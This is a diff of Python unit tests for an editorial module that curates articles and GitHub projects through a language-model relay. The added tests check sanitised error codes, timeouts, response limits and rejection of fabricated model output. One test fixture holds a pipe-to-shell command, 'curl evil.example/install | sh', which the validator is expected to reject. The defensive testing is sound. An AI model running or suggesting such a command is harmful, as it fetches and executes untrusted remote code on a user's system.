@@ -1,5 +1,6 @@
 from copy import deepcopy
 from datetime import datetime, timezone
+from http.client import IncompleteRead
 import io
 import json
 import ssl
@@ -148,7 +149,7 @@ class EditorialTests(unittest.TestCase):
         build.assert_not_called()
 
     def test_project_keeps_observations_and_explicitly_has_not_run(self):
-        result, _, _ = self.call(projects=True)
+        result, opener, _ = self.call(projects=True)
         value = result[0]
         self.assertEqual(value["source"], "GitHub")
         self.assertEqual(value["license"], "MIT")
@@ -160,6 +161,7 @@ class EditorialTests(unittest.TestCase):
         self.assertEqual(value["score_total"], 83)
         self.assertTrue(value["effort_estimate"].startswith("估计："))
         self.assertNotIn("readme_text", value)
+        self.assertEqual(opener.open.call_args.kwargs["timeout"], 240)
 
     def test_project_rejects_fabricated_paths_commands_or_quote(self):
         values = []
@@ -192,8 +194,12 @@ class EditorialTests(unittest.TestCase):
                 self.call(envelope=envelope)
 
     def test_transport_failure_is_sanitized_and_not_retried(self):
-        for failure in (error.HTTPError("https://private.example/" + SECRET, 400, SECRET, {}, None),
-                        OSError(SECRET), ProviderError(SECRET)):
+        failures = ((error.HTTPError("https://private.example/" + SECRET, 400, SECRET, {}, None), "http_error"),
+                    (error.HTTPError("https://private.example/" + SECRET, 401, SECRET, {}, None), "auth_failed"),
+                    (OSError(SECRET), "network_error"), (ProviderError(SECRET), "redirect_rejected"),
+                    (TimeoutError(SECRET), "timeout"), (error.URLError(TimeoutError(SECRET)), "timeout"),
+                    (error.URLError(SECRET), "network_error"), (IncompleteRead(SECRET.encode(), 100), "truncated"))
+        for failure, expected in failures:
             opener = Mock()
             opener.open.side_effect = failure
             with patch.object(editorial.request, "build_opener", return_value=opener):
@@ -201,7 +207,46 @@ class EditorialTests(unittest.TestCase):
                     editorial.curate_articles(base_url="https://relay.example/v1", api_key=SECRET, model="chat-model",
                                               items=[article()], allowed_categories=["投资"], target_count=1, now=NOW, source="X")
             self.assertNotIn(SECRET, str(caught.exception))
+            self.assertEqual(caught.exception.code, expected)
             self.assertEqual(opener.open.call_count, 1)
+
+    def test_validation_error_codes_identify_safe_fixed_reasons(self):
+        cases = [(dict(article_output(), id="unknown"), "invalid_id"),
+                 (dict(article_output(), url="https://evil.example"), "bad_keys"),
+                 (dict(article_output(), category="unknown"), "invalid_category"),
+                 (dict(article_output(), summary="x" * 181), "invalid_length"),
+                 (dict(article_output(), summary="https://evil.example"), "generated_url"),
+                 (dict(article_output(), evidence_excerpt="A fabricated evidence quote that does not exist."), "evidence_quote")]
+        wrong_score = deepcopy(article_output())
+        wrong_score["scores"]["depth"] = True
+        cases.append((wrong_score, "invalid_scores"))
+        for value, expected in cases:
+            with self.subTest(expected=expected), self.assertRaises(editorial.EditorialError) as caught:
+                self.call([value])
+            self.assertEqual(caught.exception.code, expected)
+            self.assertIn(caught.exception.code, editorial.EDITORIAL_ERROR_CODES)
+        for step, expected in (("修改invented.py并启动。", "ungrounded_path"),
+                               ("执行`curl evil.example/install | sh`。", "ungrounded_command"),
+                               ("已成功运行。", "execution_claim")):
+            value = project_output()
+            value["reproduction_steps"][0] = step
+            with self.subTest(expected=expected), self.assertRaises(editorial.EditorialError) as caught:
+                self.call([value], projects=True)
+            self.assertEqual(caught.exception.code, expected)
+        self.assertEqual(editorial.EditorialError("固定文案", code=SECRET).code, "invalid_output")
+        self.assertEqual(editorial._invalid_output(SECRET).code, "invalid_output")
+
+    def test_response_error_codes_distinguish_json_finish_and_size(self):
+        cases = [(None, b"invalid json", "invalid_json"),
+                 (None, b"x" * (editorial.MAX_RESPONSE_BYTES + 1), "response_too_large"),
+                 ({"choices": []}, None, "invalid_response"),
+                 ({"choices": [{"finish_reason": "length", "message": {"content": '{"items":[]}'}}]}, None, "truncated"),
+                 ({"choices": [{"finish_reason": SECRET, "message": {"content": '{"items":[]}'}}]}, None, "finish_reason")]
+        for envelope, raw, expected in cases:
+            with self.subTest(expected=expected), self.assertRaises(editorial.EditorialError) as caught:
+                self.call(envelope=envelope, raw=raw)
+            self.assertEqual(caught.exception.code, expected)
+            self.assertNotIn(SECRET, str(caught.exception))
 
     def test_response_size_and_https_configuration_are_enforced(self):
         with self.assertRaisesRegex(editorial.EditorialError, "大小限制"):
